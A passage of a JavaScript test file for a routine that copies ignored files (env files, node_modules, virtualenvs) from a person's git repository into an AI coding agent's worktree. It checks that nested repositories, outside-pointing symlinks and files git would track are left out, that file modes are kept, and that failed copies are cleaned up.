    assert.equal(fs.readlinkSync(path.join(ws2, '.venv/bin/python')), '/usr/bin/python3', 'inside a folder copied whole, as it is');
    assert.equal(readText(path.join(ws2, 'envs/py311/lib/x.py')), 'x\n');
    assert.equal(present(path.join(ws2, 'envs/README.txt')), false);
  });

  test('a repository or worktree inside a folder is never copied, so git run there cannot reach the person’s branches; the rest of the folder is', async () => {
    const t = await fillRepo({
      '.gitignore': '.claude/worktrees/\n.claude/settings.local.json\n.env\n/vendor/\nnode_modules/\n',
      '.claude/settings.json': '{}\n',
      '.worktreeinclude': '.env\n.claude/\nvendor/\nnode_modules/\n',
    }, {
      '.env': 'E=1\n', '.claude/settings.local.json': '{"local":true}\n',
      'vendor/lib/l.php': '<?php\n', 'vendor/acme/a.php': '<?php\n', 'vendor/autoload.php': '<?php\n',
      'node_modules/a/index.js': 'a\n', 'node_modules/gitdep/g.js': 'g\n', 'node_modules/.bin/a': { link: '../a/index.js' },
    });
    // Claude Code keeps its worktrees in .claude/worktrees/: this one has work staged in it. A copy of its .git file
    // would point into the person's .git, and git run in the copy would move the branch and change that index.
    const wt = t.p('.claude/worktrees/agentA');
    git(t.root, 'worktree', 'add', '-q', '-b', 'agentA', wt);
    put(wt, { 'wip.js': 'wip\n' });
    git(wt, 'add', 'wip.js');
    git(t.p('vendor/lib'), 'init', '-q'); // another repository, with a commit
    git(t.p('vendor/lib'), 'add', '-A');
    git(t.p('vendor/lib'), 'commit', '-q', '-m', 'lib');
    fs.writeFileSync(t.p('node_modules/gitdep/.git'), 'gitdir: ../../.git/modules/gitdep\n'); // a .git file, as a submodule has
    const person = () => ({ refs: git(t.root, 'for-each-ref'), staged: git(wt, 'diff', '--cached', '--name-only'), index: sha(fs.readFileSync(t.p('.git/worktrees/agentA/index'))) });
    const before = person();
    const r = await fillWorkspace({ repoRoot: t.root, path: t.ws, platform: 'darwin', clones: true, copy: cpStandIn().copy });
    assert.deepEqual(pathsOf(r.copied), ['.claude/settings.local.json', '.env', 'node_modules/.bin', 'node_modules/a', 'vendor/acme', 'vendor/autoload.php']);
    assert.deepEqual(r.skipped, ['.claude/worktrees/agentA', 'node_modules/gitdep', 'vendor/lib'].map(p => ({ path: p, why: 'nested-repo' })));
    assert.deepEqual(dotGitsUnder(t.ws), ['.git'], 'no .git below the agent’s own');
    for (const f of ['.claude/worktrees', 'vendor/lib', 'node_modules/gitdep']) assert.equal(present(t.w(f)), false, f);
    assert.equal(readText(t.w('vendor/acme/a.php')), '<?php\n');
    assert.equal(fs.readlinkSync(t.w('node_modules/.bin/a')), '../a/index.js');
    assert.equal(statusOf(t.ws), '');
    assert.deepEqual(person(), before);

    // By default too: a node_modules holding a repository is copied without it.
    fs.rmSync(t.p('.worktreeinclude'));
    const ws2 = await t.agent();
    const r2 = await fillWorkspace({ repoRoot: t.root, path: ws2, platform: 'darwin', clones: true, copy: cpStandIn().copy });
    assert.deepEqual(r2.copied.map(e => [e.path, e.kind]), [['.env', 'env'], ['node_modules/.bin', 'deps'], ['node_modules/a', 'deps']]);
    assert.deepEqual(r2.skipped, [{ path: 'node_modules/gitdep', why: 'nested-repo' }]);
    assert.deepEqual(dotGitsUnder(ws2), ['.git']);

    // A folder that is itself a repository is left out whole; one that becomes one while cp copies it is taken out of the copy.
    fs.writeFileSync(t.p('.worktreeinclude'), 'vendor/lib/\nvendor/acme/\n');
    const ws3 = await t.agent();
    const late = cpStandIn(({ src }) => {
      if (src === t.p('vendor/acme')) fs.mkdirSync(path.join(src, 'sub/.git'), { recursive: true });
    });
    try {
      const r3 = await fillWorkspace({ repoRoot: t.root, path: ws3, platform: 'darwin', clones: true, copy: late.copy });
      assert.deepEqual(pathsOf(r3.copied), ['vendor/acme']);
      assert.deepEqual(r3.skipped, ['vendor/acme/sub', 'vendor/lib'].map(p => ({ path: p, why: 'nested-repo' })));
      assert.deepEqual(dotGitsUnder(ws3), ['.git']);
      assert.equal(readText(path.join(ws3, 'vendor/acme/a.php')), '<?php\n');
    } finally {
      fs.rmSync(t.p('vendor/acme/sub'), { recursive: true, force: true });
    }
  });

  test('a virtualenv inside a folder copied whole is named too, its own links kept; where no clone can be made, it is left out of the folder', async () => {
    const t = await fillRepo({ '.gitignore': '.tox/\n.direnv/\n/tools/\n', '.worktreeinclude': '.tox/\n.direnv/\ntools/\n' }, {
      '.tox/py311/pyvenv.cfg': 'home = /usr/bin\n', '.tox/py311/bin/python': { link: '/usr/bin/python3' }, '.tox/log/x.log': 'l\n',
      '.direnv/python-3.11/pyvenv.cfg': 'home = /usr/bin\n', '.direnv/python-3.11/lib/x.py': 'x\n',
      'tools/run.sh': 'echo\n', 'tools/.venv/pyvenv.cfg': 'home = /usr/bin\n', 'tools/.venv/lib/venv/inner.py': 'x\n',
    });
    const r = await fillWorkspace({ repoRoot: t.root, path: t.ws, platform: 'darwin', clones: true, copy: cpStandIn().copy });
    assert.deepEqual(pathsOf(r.copied), ['.direnv', '.tox', 'tools']);
    assert.deepEqual(r.skipped, ['.direnv/python-3.11', '.tox/py311', 'tools/.venv'].map(p => ({ path: p, why: 'venv' })));
    assert.equal(fs.readlinkSync(t.w('.tox/py311/bin/python')), '/usr/bin/python3', 'a virtualenv’s own links stay as they are');
    // A Mac whose disk makes no clones: each virtualenv is left out of its folder, and the rest of it copied plainly.
    const ws2 = await t.agent();
    const cp = cpStandIn();
    const r2 = await fillWorkspace({ repoRoot: t.root, path: ws2, platform: 'darwin', clones: false, copy: cp.copy });
    assert.deepEqual(r2.copied.map(e => [e.path, e.cloned]), [['.tox/log', false], ['tools/run.sh', false]]);
    assert.deepEqual(r2.skipped, ['.direnv/python-3.11', '.tox/py311', 'tools/.venv'].map(p => ({ path: p, why: 'noclone' })));
    assert.ok(cp.calls.every(c => !c.args.at(-1).includes('python') && !c.args.at(-1).endsWith('.venv')), 'never a full copy of a virtualenv');
    for (const f of ['.direnv', '.tox/py311', 'tools/.venv']) assert.equal(present(path.join(ws2, f)), false, f);
  });

  test('a folder on the way swapped for a link while cp copies: the copy is taken away again', async () => {
    const outside = fs.mkdtempSync(path.join(T, 'fill-swap-'));
    fs.writeFileSync(path.join(outside, '.env'), 'OUTSIDE=stolen\n');
    const t = await fillRepo({ '.gitignore': '.env\n', 'cfg/app.yml': 'a: 1\n' }, { 'cfg/.env': 'INSIDE=1\n' });
    const cp = cpStandIn(({ src }) => {
      if (src !== t.p('cfg/.env')) return;
      fs.renameSync(t.p('cfg'), t.p('cfg-real')); // something in the person's folder swaps cfg for a link meanwhile
      fs.symlinkSync(outside, t.p('cfg'));
    });
    const r = await fillWorkspace({ repoRoot: t.root, path: t.ws, platform: 'darwin', clones: true, copy: cp.copy });
    assert.deepEqual([r.copied, r.skipped], [[], [{ path: 'cfg/.env', why: 'link-outside' }]]);
    assert.equal(present(t.w('cfg/.env')), false);
  });

  test('a link that points inside the person’s folder is copied as a link; one that points outside is not, inside a folder copied whole either', async () => {
    const outside = path.join(T, 'fill-outside.env');
    fs.writeFileSync(outside, 'OUTSIDE=1\n');
    const elsewhere = fs.mkdtempSync(path.join(T, 'fill-elsewhere-'));
    fs.mkdirSync(path.join(elsewhere, 'deep'));
    fs.writeFileSync(path.join(elsewhere, 'secret.env'), 'OUTSIDE_SECRET=1\n');
    const t = await fillRepo({
      '.gitignore': '.env*\n/lnk\nnode_modules/\n', 'config/dev.env': 'DEV=1\n', 'packages/lib/index.js': 'lib\n',
      'deep': { link: path.join(elsewhere, 'deep') }, // tracked links that leave the repository
      'rel': { link: `../${path.basename(elsewhere)}/deep` },
    }, {
      '.env': { link: 'config/dev.env' },
      '.env.dangling': { link: 'missing/dev.env' }, // leads nowhere yet, inside
      '.env.local': { link: outside },
      '.env.up': { link: '../fill-outside.env' },
      'lnk': { link: elsewhere },
      '.env.through': { link: 'lnk/dev.env' }, // inside as written, outside once lnk is followed
      // path.resolve would call these inside; the kernel follows deep first and takes .. from where it lands.
      '.env.updown': { link: 'deep/../secret.env' },
      '.env.rel': { link: 'rel/../secret.env' },
      '.env.dotdot': { link: 'nothere/../config/dev.env' }, // a link made at nothere later could lead its .. anywhere
      'node_modules/x/index.js': 'x\n',
      'node_modules/.bin/x': { link: '../x/index.js' }, // inside: kept
      'node_modules/@app/lib': { link: '../../packages/lib' }, // inside, through the tracked files: kept
      'node_modules/out': { link: outside },
      'node_modules/up': { link: '../..' },
      'node_modules/through': { link: '../lnk/secret.env' },
    });
    // Absolute, even into the person's folder: its copy would point there, never into the agent's folder. And out of
    // the repository and back in through its own name: in the agent's folder that name is another folder.
    fs.symlinkSync(t.p('config/dev.env'), t.p('.env.abs'));
    fs.symlinkSync(t.p('packages/lib'), t.p('node_modules/abs'));
    fs.symlinkSync(`../${path.basename(t.root)}/config/dev.env`, t.p('.env.back'));
    const r = await fillWorkspace({ repoRoot: t.root, path: t.ws, platform: 'darwin', clones: true, copy: cpStandIn().copy });
    assert.deepEqual(r.copied.map(e => [e.path, e.kind]), [['.env', 'env'], ['.env.dangling', 'env'], ['node_modules', 'deps']]);
    const out = ['.env.abs', '.env.back', '.env.dotdot', '.env.local', '.env.rel', '.env.through', '.env.up', '.env.updown',
      'node_modules/abs', 'node_modules/out', 'node_modules/through', 'node_modules/up'];
    assert.deepEqual(r.skipped, out.map(p => ({ path: p, why: 'link-outside' })));
    assert.equal(fs.readlinkSync(t.w('.env')), 'config/dev.env');
    assert.equal(readText(t.w('.env')), 'DEV=1\n', 'it leads to the agent’s own copy of the tracked file');
    assert.equal(fs.readlinkSync(t.w('.env.dangling')), 'missing/dev.env');
    assert.equal(fs.readlinkSync(t.w('node_modules/.bin/x')), '../x/index.js');
    assert.equal(readText(t.w('node_modules/@app/lib/index.js')), 'lib\n', 'the agent’s own packages/lib');
    for (const f of out) assert.equal(present(t.w(f)), false, f);
    assert.equal(readText(outside), 'OUTSIDE=1\n');
    assert.equal(readText(path.join(elsewhere, 'secret.env')), 'OUTSIDE_SECRET=1\n');
  });

  test('nothing already in the agent’s folder is replaced, and nothing is written through a link there', async () => {
    const t = await fillRepo({
      '.gitignore': '.env*\nnode_modules/\n',
      'shared/readme.md': 'shared\n',
      'conf': { link: 'shared' },
      '.env.shared': 'COMMITTED=1\n',
    }, {}, { forced: ['.env.shared'] });
    // In the person's folder: .env.shared is no longer tracked (the commit still holds it), and conf became a folder.
    git(t.root, 'rm', '-q', '--cached', '.env.shared');
    fs.writeFileSync(t.p('.env.shared'), 'PERSON=1\n');
    fs.rmSync(t.p('conf'));
    put(t.root, { 'conf/.env': 'CONF=1\n', '.env': 'PERSON=1\n', '.env.local': 'LOCAL=1\n', 'node_modules/x/index.js': 'x\n' });
    // In the agent's folder: a .env and a node_modules of its own (a post-checkout hook may make them).
    put(t.ws, { '.env': 'AGENT=1\n', 'node_modules/keep.txt': 'kept\n' });
    const cp = cpStandIn();
    const r = await fillWorkspace({ repoRoot: t.root, path: t.ws, platform: 'darwin', clones: true, copy: cp.copy });
    assert.deepEqual(r.copied, [{ path: '.env.local', kind: 'env', cloned: true }]);
    assert.deepEqual(r.skipped, ['.env', '.env.shared', 'conf/.env', 'node_modules'].map(p => ({ path: p, why: 'exists' })));
    assert.deepEqual(cp.calls.map(c => c.args.at(-1)), [t.w('.env.local')]);
    assert.equal(readText(t.w('.env')), 'AGENT=1\n');
    assert.equal(readText(t.w('.env.shared')), 'COMMITTED=1\n');
    assert.equal(fs.readlinkSync(t.w('conf')), 'shared');
    assert.equal(present(t.w('shared/.env')), false);
    assert.deepEqual(fs.readdirSync(t.w('node_modules')), ['keep.txt']);
  });

  test('each file keeps its mode: a 0600 .env stays 0600; a folder made on the way gets the person’s folder’s mode', async () => {
    const t = await fillRepo({ '.gitignore': '.env*\n.envrc\n' },
      { '.env': 'A=1\n', '.env.local': 'B=1\n', '.envrc': 'C=1\n', 'cfg/.env.test': 'D=1\n', 'private/.env.local': 'E=1\n', 'team/deep/.env': 'F=1\n' });
    const modes = { '.env': 0o600, '.env.local': 0o640, '.envrc': 0o755, 'cfg/.env.test': 0o400, 'private/.env.local': 0o644, 'team/deep/.env': 0o644 };
    for (const [f, m] of Object.entries(modes)) fs.chmodSync(t.p(f), m);
    // A 0644 file the person keeps private only with its folder's mode: so is the agent's copy.
    const folders = { private: 0o700, team: 0o750, 'team/deep': 0o710, cfg: 0o755 };
    for (const [f, m] of Object.entries(folders)) fs.chmodSync(t.p(f), m);
    const r = await fillWorkspace({ repoRoot: t.root, path: t.ws }); // the real cp, on this computer
    assert.deepEqual(pathsOf(r.copied), Object.keys(modes).sort());
    for (const [f, m] of Object.entries(modes)) {
      assert.equal(modeOf(t.w(f)), m, f);
      assert.equal(readText(t.w(f)), readText(t.p(f)), f);
    }
    for (const [f, m] of Object.entries(folders)) assert.equal(modeOf(t.w(f)), m, f);
  });

  test('a folder made on the way always stays open to its owner, whatever the person’s folder’s mode', async () => {
    const t = await fillRepo({ '.gitignore': '.env*\n' }, { 'locked/.env': 'A=1\n' });
    fs.chmodSync(t.p('locked'), 0o555);
    try {
      const r = await fillWorkspace({ repoRoot: t.root, path: t.ws, platform: 'darwin', clones: true, copy: cpStandIn().copy });
      assert.deepEqual(pathsOf(r.copied), ['locked/.env']);
      assert.equal(modeOf(t.w('locked')), 0o755, 'read and search as the person’s, and writable for its owner');
    } finally {
      fs.chmodSync(t.p('locked'), 0o755);
    }
  });

  const SMALL = [{ '.gitignore': '.env*\nnode_modules/\n', 'packages/a/package.json': '{}\n' },
    { '.env': 'E=1\n', 'node_modules/x/index.js': 'x\n', 'packages/a/node_modules/y/index.js': 'y\n' }];

  test('on a Mac each entry is cloned by /bin/cp -c -R -p, given as an argument array, within five minutes', async () => {
    const t = await fillRepo(...SMALL);
    const cp = cpStandIn();
    const r = await fillWorkspace({ repoRoot: t.root, path: t.ws, platform: 'darwin', clones: true, copy: cp.copy });
    assert.deepEqual(r.copied.map(e => [e.path, e.cloned]), [['.env', true], ['node_modules', true], ['packages/a/node_modules', true]]);
    const calls = [...cp.calls].sort((a, b) => (a.args.at(-1) < b.args.at(-1) ? -1 : 1));
    assert.deepEqual(calls.map(c => [c.file, c.args]),
      ['.env', 'node_modules', 'packages/a/node_modules'].map(p => ['/bin/cp', ['-c', '-R', '-p', t.p(p), t.w(p)]]));
    for (const c of calls) assert.ok(c.timeout > 0 && c.timeout <= 5 * 60_000, String(c.timeout));
  });

  test('on a Mac whose disk makes no clones (another volume, or HFS+), cp -c is never tried: a file is copied plainly and a folder is left out', async () => {
    // On HFS+ cp -c makes a full copy without a word, so the disks are looked at first, never cp's words.
    const t = await fillRepo(...SMALL);
    const cp = cpStandIn();
    const r = await fillWorkspace({ repoRoot: t.root, path: t.ws, platform: 'darwin', clones: false, copy: cp.copy });
    assert.deepEqual(r.copied, [{ path: '.env', kind: 'env', cloned: false }]);
    assert.deepEqual(r.skipped, [{ path: 'node_modules', why: 'noclone' }, { path: 'packages/a/node_modules', why: 'noclone' }]);
    assert.deepEqual(cp.calls.map(c => [c.file, c.args]), [['/bin/cp', ['-R', '-p', t.p('.env'), t.w('.env')]]], 'one plain copy, and no clone tried');
    assert.equal(readText(t.w('.env')), 'E=1\n');
    for (const f of ['node_modules', 'packages/a/node_modules']) assert.equal(present(t.w(f)), false, f);
  });

  test('on a Mac that makes clones, a cp -c that fails is that entry’s failure only, whatever it says: a file that vanished is not a disk without clones', async () => {
    const t = await fillRepo(SMALL[0], { ...SMALL[1], 'packages/b/node_modules/z/index.js': 'z\n', 'packages/b/package.json': '{}\n' });
    const cp = cpStandIn(({ args, dst }) => {
      if (dst !== t.w('node_modules')) return;
      // npm install replacing a package while cp clones it: cp's words then hold "clonefile failed" too.
      fs.mkdirSync(path.join(dst, 'x'), { recursive: true });
      throw cpError(`cp: ${dst}/x/index.js: clonefile failed: No such file or directory\ncp: ${dst}/x/index.js: No such file or directory\n`);
    });
    const r = await fillWorkspace({ repoRoot: t.root, path: t.ws, platform: 'darwin', clones: true, copy: cp.copy });
    assert.deepEqual(r.copied.map(e => [e.path, e.cloned]), [['.env', true], ['packages/a/node_modules', true], ['packages/b/node_modules', true]]);
    assert.deepEqual(r.skipped, [{ path: 'node_modules', why: 'failed' }]);
    assert.ok(cp.calls.every(c => c.args[0] === '-c'), 'never a plain copy after it');
    assert.equal(present(t.w('node_modules')), false, 'the half-made copy is gone');
  });

  test('on a Mac, the clones are really made: every file, links as links, modes kept', { skip: process.platform !== 'darwin' && 'cp -c is the Mac’s' }, async () => {
    const files = { '.env': 'TOKEN=1\n', '.env.local': { link: '.env' }, 'node_modules/.bin/tool': { link: '../pkg0/lib/f0.js' } };
    for (let i = 0; i < 40; i++) files[`node_modules/pkg${i % 8}/lib/f${i}.js`] = `module.exports = ${i};\n`;
    const t = await fillRepo({ '.gitignore': '.env*\nnode_modules/\n' }, files);
    fs.chmodSync(t.p('.env'), 0o600);
    fs.chmodSync(t.p('node_modules/pkg1/lib/f1.js'), 0o755);
    const r = await fillWorkspace({ repoRoot: t.root, path: t.ws });
    assert.deepEqual(r.copied, [['.env', 'env'], ['.env.local', 'env'], ['node_modules', 'deps']].map(([p, kind]) => ({ path: p, kind, cloned: true })));
    assert.deepEqual(r.skipped, []);
    assert.deepEqual(folderPrint(t.w('node_modules')), folderPrint(t.p('node_modules')));
    assert.equal(fs.readlinkSync(t.w('node_modules/.bin/tool')), '../pkg0/lib/f0.js');
    assert.equal(fs.readlinkSync(t.w('.env.local')), '.env');
    assert.equal(modeOf(t.w('.env')), 0o600);
    assert.equal(modeOf(t.w('node_modules/pkg1/lib/f1.js')), 0o755);
  });

  test('on Linux an env file is copied with --reflink=auto, and node_modules only as a clone: where there are none, it is left out', async () => {
    const t = await fillRepo(SMALL[0], { ...SMALL[1], '.env.local': 'L=1\n' });
    const ext4 = cpStandIn(({ args, src, dst }) => {
      if (!args.includes('--reflink=always')) return;
      fs.mkdirSync(dst); // cp makes the folder, then cannot clone a file into it
      throw cpError(`cp: failed to clone '${dst}/x/index.js' from '${src}/x/index.js': Operation not supported\n`);
    });
    const r = await fillWorkspace({ repoRoot: t.root, path: t.ws, platform: 'linux', copy: ext4.copy });
    assert.deepEqual(r.copied, [{ path: '.env', kind: 'env', cloned: false }, { path: '.env.local', kind: 'env', cloned: false }]);
    assert.deepEqual(r.skipped, [{ path: 'node_modules', why: 'noclone' }, { path: 'packages/a/node_modules', why: 'noclone' }]);
    for (const c of ext4.calls) {
      assert.ok(['/bin/cp', 'cp'].includes(c.file), c.file);
      const p = path.relative(t.ws, c.args.at(-1));
      assert.deepEqual(c.args, ['-a', p.endsWith('node_modules') ? '--reflink=always' : '--reflink=auto', t.p(p), t.w(p)]);
    }
    assert.equal(present(t.w('node_modules')), false, 'the half-made copy is gone');
    assert.equal(present(t.w('packages/a/node_modules')), false);
    // Where the disk makes clones (btrfs, XFS), node_modules is one.
    const ws2 = await t.agent();
    const r2 = await fillWorkspace({ repoRoot: t.root, path: ws2, platform: 'linux', copy: cpStandIn().copy });
    assert.deepEqual(r2.copied.map(e => [e.path, e.cloned]), [['.env', false], ['.env.local', false], ['node_modules', true], ['packages/a/node_modules', true]]);
    assert.equal(readText(path.join(ws2, 'packages/a/node_modules/y/index.js')), 'y\n');
  });

  test('on Linux only the words of a disk without clones mean one: any other failure of --reflink=always is that entry’s own', async () => {
    const t = await fillRepo(SMALL[0], { ...SMALL[1], 'packages/b/node_modules/z/index.js': 'z\n', 'packages/b/package.json': '{}\n' });
    const cp = cpStandIn(({ args, src, dst }) => {
      if (dst !== t.w('node_modules')) return;
      fs.mkdirSync(dst);
      throw cpError(`cp: failed to clone '${dst}/x/index.js' from '${src}/x/index.js': No space left on device\n`);
    });
    const r = await fillWorkspace({ repoRoot: t.root, path: t.ws, platform: 'linux', copy: cp.copy });
    assert.deepEqual(r.copied.map(e => [e.path, e.cloned]), [['.env', false], ['packages/a/node_modules', true], ['packages/b/node_modules', true]]);
    assert.deepEqual(r.skipped, [{ path: 'node_modules', why: 'failed' }]);
    assert.equal(present(t.w('node_modules')), false);
    // Each of the words GNU cp says when no clone can be made at all means that disk: left out.
    for (const said of ['Operation not supported', 'Invalid cross-device link', 'Inappropriate ioctl for device']) {
      const ws = await t.agent();
      const none = cpStandIn(({ args, src, dst }) => {
        if (args.includes('--reflink=always')) throw cpError(`cp: failed to clone '${dst}/x/index.js' from '${src}/x/index.js': ${said}\n`);
      });
      const r2 = await fillWorkspace({ repoRoot: t.root, path: ws, platform: 'linux', copy: none.copy });
      assert.deepEqual(r2.skipped.map(s => s.why), ['noclone', 'noclone', 'noclone'], said);
    }
  });

  test('what .worktreeinclude chooses inside a folder of installed packages, or a store of them, also needs a clone (Linux, ext4)', async () => {
    const t = await fillRepo({
      '.gitignore': 'node_modules/\n.env\n.pnpm-store/\n/vendor/\n',
      '.worktreeinclude': '.env\nnode_modules/next/\n.pnpm-store/\nvendor/\n',
    }, {
      '.env': 'E=1\n', 'node_modules/next/package.json': '{}\n', 'node_modules/react/package.json': '{}\n',
      '.pnpm-store/v3/files/00/abc': 'x\n', 'vendor/autoload.php': '<?php\n', 'vendor/acme/lib/src/A.php': '<?php\n',
    });
    const ext4 = cpStandIn(({ args, src, dst }) => {
      if (args.includes('--reflink=always')) throw cpError(`cp: failed to clone '${dst}/a' from '${src}/a': Operation not supported\n`);
    });
    const r = await fillWorkspace({ repoRoot: t.root, path: t.ws, platform: 'linux', copy: ext4.copy });
    assert.deepEqual(r.copied, [{ path: '.env', kind: 'listed', cloned: false }]);
    assert.deepEqual(r.skipped, ['.pnpm-store', 'node_modules/next', 'vendor'].map(p => ({ path: p, why: 'noclone' })));
    assert.ok(!ext4.calls.some(c => c.args.includes('--reflink=auto') && c.args.at(-1) !== t.w('.env')), 'never a full copy of a package');
    for (const f of ['node_modules', '.pnpm-store', 'vendor']) assert.equal(present(t.w(f)), false, f);
    // The same on a Mac whose disk makes no clones: no cp at all for them.
    const mac = cpStandIn();
    const ws2 = await t.agent();
    const r2 = await fillWorkspace({ repoRoot: t.root, path: ws2, platform: 'darwin', clones: false, copy: mac.copy });
    assert.deepEqual(r2.skipped, r.skipped);
    assert.deepEqual(mac.calls.map(c => c.args.at(-1)), [path.join(ws2, '.env')]);
  });

  test('only a folder of installed packages or a virtualenv needs a clone; where none can be made, any other listed folder is copied plainly', async () => {
    const t = await fillRepo({ '.gitignore': '.env\nnode_modules/\n.venv/\n/secrets/\n', '.worktreeinclude': '.env\nnode_modules/\n.venv/\nsecrets/\n' }, {
      '.env': 'E=1\n', 'node_modules/x/index.js': 'x\n', '.venv/pyvenv.cfg': 'home = /usr/bin\n', 'secrets/key.pem': 'key\n', 'secrets/more/b.pem': 'b\n',
    });
    // A Mac whose disk makes no clones (the folder is on another volume), and a Linux disk with none (ext4).
    const mac = cpStandIn();
    const ext4 = cpStandIn(({ args, src, dst }) => {
      if (args.includes('--reflink=always')) throw cpError(`cp: failed to clone '${dst}' from '${src}': Operation not supported\n`);
    });
    for (const [platform, cp, plain] of [['darwin', mac, ['-R', '-p']], ['linux', ext4, ['-a', '--reflink=auto']]]) {
      const ws = await t.agent();
      const r = await fillWorkspace({ repoRoot: t.root, path: ws, platform, clones: platform === 'darwin' ? false : undefined, copy: cp.copy });
      assert.deepEqual(r.copied, ['.env', 'secrets'].map(p => ({ path: p, kind: 'listed', cloned: false })), platform);
      assert.deepEqual(r.skipped, [{ path: '.venv', why: 'noclone' }, { path: 'node_modules', why: 'noclone' }], platform);
      assert.ok(cp.calls.some(c => c.args.join('\n') === [...plain, t.p('secrets'), path.join(ws, 'secrets')].join('\n')), platform);
      assert.equal(readText(path.join(ws, 'secrets/more/b.pem')), 'b\n');
      for (const f of ['node_modules', '.venv']) assert.equal(present(path.join(ws, f)), false, `${platform} ${f}`);
    }
  });

  test('an entry that fails is left out and its half-made copy removed; the others are still copied', async () => {
    const t = await fillRepo({ '.gitignore': '.env*\n.envrc\nnode_modules/\n', 'packages/a/package.json': '{}\n' }, {
      '.env': 'E=1\n', '.env.local': 'L=1\n', '.envrc': 'R=1\n', 'src/.env': 'S=1\n',
      'node_modules/x/index.js': 'x\n', 'packages/a/node_modules/y/index.js': 'y\n',
    });
    const cp = cpStandIn(({ dst }) => {
      if (dst.endsWith('.env.local')) throw cpError(`cp: ${dst}: Permission denied\n`);
      if (dst === t.w('packages/a/node_modules')) {
        fs.mkdirSync(path.join(dst, 'y'), { recursive: true }); // stopped part-way by its time limit
        throw cpError('', { code: null, killed: true, signal: 'SIGTERM' });
      }
    });
    const copy = (file, args, o) => {
      if (args.at(-1).endsWith('.envrc')) throw new Error('cp could not be started'); // thrown at once, not a rejection
      return cp.copy(file, args, o);
    };
    const r = await fillWorkspace({ repoRoot: t.root, path: t.ws, platform: 'darwin', clones: true, copy });
    assert.deepEqual(pathsOf(r.copied), ['.env', 'node_modules', 'src/.env']);
    assert.deepEqual(r.skipped, ['.env.local', '.envrc', 'packages/a/node_modules'].map(p => ({ path: p, why: 'failed' })));
    for (const f of ['.env.local', '.envrc', 'packages/a/node_modules']) assert.equal(present(t.w(f)), false, f);
    assert.equal(readText(t.w('src/.env')), 'S=1\n');
    assert.equal(readText(t.w('node_modules/x/index.js')), 'x\n');
  });

  test('a half-made copy is taken away even where cp kept a folder read-only, as the person’s is', async () => {
    const t = await fillRepo({ '.gitignore': 'node_modules/\n', 'packages/a/package.json': '{}\n' },
      { 'node_modules/aa/sub/file.js': 'x\n', 'node_modules/zz/locked.js': 'z\n', 'packages/a/node_modules/y/index.js': 'y\n' });
    const cp = cpStandIn(({ dst }) => {
      if (dst !== t.w('node_modules')) return;
      // cp -p kept aa/ read-only (Go's module cache is), then could not read zz/locked.js and gave up.
      fs.mkdirSync(path.join(dst, 'aa/sub/none'), { recursive: true });
      fs.writeFileSync(path.join(dst, 'aa/sub/file.js'), 'x\n');
      fs.chmodSync(path.join(dst, 'aa/sub/none'), 0o000);
      fs.chmodSync(path.join(dst, 'aa/sub'), 0o555);
      fs.chmodSync(path.join(dst, 'aa'), 0o555);
      throw cpError(`cp: ${t.p('node_modules/zz/locked.js')}: Permission denied\n`);
    });
    try {
      const r = await fillWorkspace({ repoRoot: t.root, path: t.ws, platform: 'darwin', clones: true, copy: cp.copy });
      assert.deepEqual(r.skipped, [{ path: 'node_modules', why: 'failed' }]);
      assert.deepEqual(pathsOf(r.copied), ['packages/a/node_modules']);
      assert.equal(present(t.w('node_modules')), false, 'the half-made copy is gone');
    } finally {
      openAll(t.w('node_modules'));
    }
  });

  test('a half-made copy that cannot be taken away is named as left', { skip: process.platform !== 'darwin' && 'chflags is the Mac’s' }, async () => {
    const t = await fillRepo(...SMALL);
    const stuck = t.w('node_modules/x/index.js');
    const cp = cpStandIn(({ dst }) => {
      if (dst !== t.w('node_modules')) return;
      put(dst, { 'x/index.js': 'x\n' });
      execFileSync('/usr/bin/chflags', ['uchg', stuck]); // cp -p keeps a locked file locked: nothing can remove it
      throw cpError(`cp: ${dst}: Input/output error\n`);
    });
    try {
      const r = await fillWorkspace({ repoRoot: t.root, path: t.ws, platform: 'darwin', clones: true, copy: cp.copy });
      assert.deepEqual(r.skipped, [{ path: 'node_modules', why: 'failed', left: true }]);
      assert.deepEqual(pathsOf(r.copied), ['.env', 'packages/a/node_modules']);
    } finally {
      if (present(stuck)) execFileSync('/usr/bin/chflags', ['nouchg', stuck]);
    }
  });

  test('what git in the agent’s folder would not ignore is taken away again: it would be the agent’s work, and a merge would bring it in', async () => {
    // The commit ignores node_modules only: the person added .env to .gitignore without committing it.
    const t = await fillRepo({ '.gitignore': 'node_modules/\n', 'index.js': 'x\n' },
      { '.env': 'SECRET=1\n', 'cfg/.env.local': 'L=1\n', 'node_modules/m/index.js': 'm\n' });
    fs.appendFileSync(t.p('.gitignore'), '.env\n.env.*\n');
    const base = git(t.ws, 'rev-parse', 'HEAD');
    const r = await fillWorkspace({ repoRoot: t.root, path: t.ws, platform: 'darwin', clones: true, copy: cpStandIn().copy });
    assert.deepEqual(r.copied, [{ path: 'node_modules', kind: 'deps', cloned: true }]);
    assert.deepEqual(r.skipped, [{ path: '.env', why: 'not-ignored' }, { path: 'cfg/.env.local', why: 'not-ignored' }]);
    for (const f of ['.env', 'cfg']) assert.equal(present(t.w(f)), false, f);
    assert.equal(statusOf(t.ws), '');
    assert.deepEqual((await snapshotWork({ repoRoot: t.root, path: t.ws, since: base })).files, []);
    assert.deepEqual((await diffStats({ path: t.ws, base })).list, []);

    // No .gitignore committed at all: the person's own, never committed, ignores everything that is copied.
    const u = await fillRepo({ 'index.js': 'x\n' }, { '.gitignore': '.env\nnode_modules/\n', '.env': 'S=1\n', 'node_modules/m/index.js': 'm\n' });
    const r2 = await fillWorkspace({ repoRoot: u.root, path: u.ws, platform: 'darwin', clones: true, copy: cpStandIn().copy });
    assert.deepEqual([r2.copied, r2.skipped], [[], ['.env', 'node_modules'].map(p => ({ path: p, why: 'not-ignored' }))]);
    assert.equal(statusOf(u.ws), '');

    // A folder copied whole goes as a whole when git there would see any file in it.
    const v = await fillRepo({ '.gitignore': '*.pem\n', '.worktreeinclude': 'secrets/\n' }, { 'secrets/key.pem': 'k\n', 'secrets/notes.txt': 'n\n' });
    fs.appendFileSync(v.p('.gitignore'), '/secrets/\n');
    const r3 = await fillWorkspace({ repoRoot: v.root, path: v.ws, platform: 'darwin', clones: true, copy: cpStandIn().copy });
    assert.deepEqual([r3.copied, r3.skipped], [[], [{ path: 'secrets', why: 'not-ignored' }]]);
    assert.equal(present(v.w('secrets')), false);
  });

  test('the check at the end has time kept for it, and when git cannot make it, nothing copied stays', async () => {
    const t = await fillRepo({ '.gitignore': 'node_modules/\n' }, { '.env': 'S=1\n', 'node_modules/m/index.js': 'm\n' });
